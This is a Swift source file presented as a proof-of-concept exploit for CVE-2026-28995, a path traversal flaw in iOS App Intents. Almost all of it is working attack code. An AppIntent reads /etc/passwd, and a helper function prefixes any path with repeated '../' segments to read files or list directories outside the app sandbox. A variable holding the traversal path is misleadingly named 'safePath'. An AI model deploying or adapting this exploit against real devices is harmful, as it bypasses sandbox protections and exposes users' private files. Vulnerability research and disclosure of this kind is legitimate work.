import AppIntents

/// CVE-2026-28995 PoC — Path Traversal in App Intents
/// Affects iOS 26.4.2 and below
public struct CVE_2026_28995: AppIntent {
    public static var title: LocalizedStringResource = "CVE-2026-28995"
    public static var description: IntentDescription = IntentDescription(
        "PoC for CVE-2026-28995 — Path Traversal via App Intents"
    )

    public init() {}

    @MainActor
    public func perform() async throws -> some IntentResult {
        print("[!] CVE-2026-28995 PoC executed")

        // Demo: read /etc/passwd
        let result = readCve(path: "../../../../../../../../../../../../../etc/passwd")
        print("[+] Result:\n\(result)")

        return .result()
    }

    // MARK: - Core Function

    /// Reads a file or directory outside the sandbox
    /// - Parameter path: Relative path (supports directory traversal with ../)
    /// - Returns: File content, directory listing, or error message
    public func readCve(path: String) -> String {
        let fileManager = FileManager.default

        // Normalize path
        let normalizedPath = path.replacingOccurrences(of: "//", with: "/")

        // Add guaranteed root traversal
        let safePath = "../../../../../../../../../../../../../" + normalizedPath
        let resolvedPath = NSString(string: safePath).expandingTildeInPath

        // Check if file/directory exists
        if !fileManager.fileExists(atPath: resolvedPath) {
            return "[ERROR] File or directory not found: \(normalizedPath)"
        }

        // Check if it's a directory
        var isDirectory: ObjCBool = false
        fileManager.fileExists(atPath: resolvedPath, isDirectory: &isDirectory)

        if isDirectory.boolValue {
            do {
                let contents = try fileManager.contentsOfDirectory(atPath: resolvedPath)
                return "[DIRECTORY]\nContents:\n" + contents.joined(separator: "\n")
            } catch {
                return "[ERROR] Failed to read directory: \(error.localizedDescription)"
            }
        }

        // Read file
        do {
            let content = try String(contentsOfFile: resolvedPath, encoding: .utf8)
            return content
        } catch {
            return "[ERROR] Failed to read file: \(error.localizedDescription)"
        }
    }
}


